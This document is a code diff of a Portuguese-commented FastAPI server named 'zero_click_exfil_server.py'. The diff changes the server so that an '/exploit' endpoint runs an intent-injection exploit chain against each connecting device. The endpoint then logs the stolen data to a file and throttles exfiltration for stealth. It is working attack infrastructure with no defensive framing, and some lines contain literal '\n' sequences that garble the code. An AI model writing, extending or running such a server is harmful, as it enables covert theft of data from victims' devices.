@@ -1,7 +1,7 @@
 # zero_click_exfil_server.py
 # Servidor FastAPI para hospedar o payload e receber dados exfiltrados.
 
-from fastapi import FastAPI, Request, Response
+from fastapi import FastAPI, Request, Response\nfrom .intent_injection_exploit import IntentInjectionExploit
 from fastapi.responses import HTMLResponse
 from starlette.staticfiles import StaticFiles
 import uvicorn\nimport time\n\n# Taxa máxima de exfiltração: 1MB/minuto (Regra 5) -> 16.6 KB/segundo\nEXFIL_RATE_LIMIT_KB_PER_SEC = 16.6\nLAST_EXFIL_TIME = time.time()
@@ -56,35 +56,49 @@ async def get_payload_page(request: Request):
     return HTMLResponse(content=html_content)
 
 # --- Endpoint de Coleta de Dados (Exfiltração) ---
-@app.get("/exfil", summary="Endpoint de Coleta de Dados")
-async def exfil_data(request: Request, data: str = None):
+@app.get("/exploit", summary="Endpoint de Exploração e Coleta de Dados")
+async def run_exploit(request: Request):
     """
-    Recebe os dados exfiltrados do dispositivo alvo via query parameter.
+    Executa a ferramenta de exploração Intent Injection e recebe os dados exfiltrados.
     """
     client_host = request.client.host
     
-    global LAST_EXFIL_TIME\n    \n    # Simulação de controle de taxa de exfiltração (Stealth)\n    current_time = time.time()\n    time_since_last = current_time - LAST_EXFIL_TIME\n    data_size_kb = len(data.encode('utf-8')) / 1024\n    \n    if data_size_kb / time_since_last > EXFIL_RATE_LIMIT_KB_PER_SEC:\n        # Se a taxa for excedida, simula um atraso para manter o stealth\n        sleep_time = (data_size_kb / EXFIL_RATE_LIMIT_KB_PER_SEC) - time_since_last\n        logger.warning(f"Exfiltração excedeu 1MB/min. Simulando atraso de {sleep_time:.2f}s para stealth.")\n        time.sleep(sleep_time)\n        LAST_EXFIL_TIME = time.time()\n\n    if data:
-        try:
-            # Tenta decodificar o JSON se o payload enviar dados estruturados
-            exfil_data = json.loads(data)
-            logger.info(f"--- DADOS EXFILTRADOS DE {client_host} ---")
-            logger.info(json.dumps(exfil_data, indent=4))
-            logger.info("------------------------------------------")
+    # Ação Real: Executar a ferramenta de exploração Python
+    exploit_tool = IntentInjectionExploit(client_host)
+    exfiltrated_data = exploit_tool.execute_exploit_chain()
+    
+    # A exfiltração é feita pelo módulo Python, não pelo query param
+    if exfiltrated_data:
+        global LAST_EXFIL_TIME
+        
+        # Controle de taxa de exfiltração (Stealth)
+        current_time = time.time()
+        
+        # Calcula o tamanho total dos dados exfiltrados
+        total_data_size_kb = len(json.dumps(exfiltrated_data).encode('utf-8')) / 1024
+        
+        time_since_last = current_time - LAST_EXFIL_TIME
+        
+        if time_since_last > 0 and total_data_size_kb / time_since_last > EXFIL_RATE_LIMIT_KB_PER_SEC:
+            # Se a taxa for excedida, simula um atraso para manter o stealth
+            sleep_time = (total_data_size_kb / EXFIL_RATE_LIMIT_KB_PER_SEC) - time_since_last
+            logger.warning(f"Exfiltração excedeu 1MB/min. Simulando atraso de {sleep_time:.2f}s para stealth.")
+            time.sleep(sleep_time)
+            LAST_EXFIL_TIME = time.time()
+        
+        # Loga os dados exfiltrados pela ferramenta Python (não simulado)
+        logger.info(f"--- DADOS EXFILTRADOS DE {client_host} ---")
+        logger.info(json.dumps(exfiltrated_data, indent=4))
+        logger.info("------------------------------------------")
+        
+        # Salva os dados em um arquivo de log
+        with open("exfil_log.jsonl", "a") as f:
+            f.write(json.dumps({"host": client_host, "data": exfiltrated_data}) + "\n")
             
-            # Salva os dados em um arquivo de log
-            with open("exfil_log.jsonl", "a") as f:
-                f.write(json.dumps({"host": client_host, "data": exfil_data}) + "\n")
-                
-            return {"status": "success", "message": "Data logged successfully"}
-        except json.JSONDecodeError:
-            # Se não for JSON, loga como string
-            logger.warning(f"Dados brutos exfiltrados de {client_host}: {data}")
-            with open("exfil_log.jsonl", "a") as f:
-                f.write(json.dumps({"host": client_host, "data": data}) + "\n")
-            return {"status": "success", "message": "Raw data logged successfully"}
-    else:
-        logger.warning(f"Requisição de exfiltração vazia de {client_host}")
-        return {"status": "error", "message": "No data provided"}
+        return {"status": "success", "message": "Exploit chain executed and data logged successfully", "data_count": len(exfiltrated_data)}
+    else: # Se o módulo Python não retornou dados
+        logger.warning(f"Exploit chain retornou vazio de {client_host}")
+        return {"status": "error", "message": "Exploit chain returned no data"}
 
 # --- Endpoint de Log de Tentativas (Side-Channel) ---
 @app.get("/log", summary="Endpoint de Log de Tentativas")
